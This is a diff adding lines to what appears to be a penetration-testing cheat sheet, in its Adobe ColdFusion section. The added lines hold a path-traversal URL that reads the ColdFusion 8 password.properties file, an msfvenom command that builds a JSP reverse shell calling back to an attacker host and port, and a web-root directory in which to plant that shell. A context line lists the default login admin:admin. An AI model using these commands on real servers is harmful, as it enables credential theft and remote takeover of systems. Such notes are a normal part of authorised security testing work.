@@ -146,8 +146,11 @@ find version > /CHANGELOG.txt
 
 Adobe Cold Fusion
 check version /CFIDE/adminapi/base.cfc?wsdl
-fckeditor Version 8  LFI > http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
-
+fckeditor Version 8  LFI
+-     http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+-     sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.10.12 LPORT=4545 -f raw > raman.jsp
+save the payload in the following directory
+-     C:\ColdFusion8\wwwroot\CFIDE\raman.jsp
 Elastix
 Google the vulnerabilities
 default login are admin:admin at /vtigercrm/
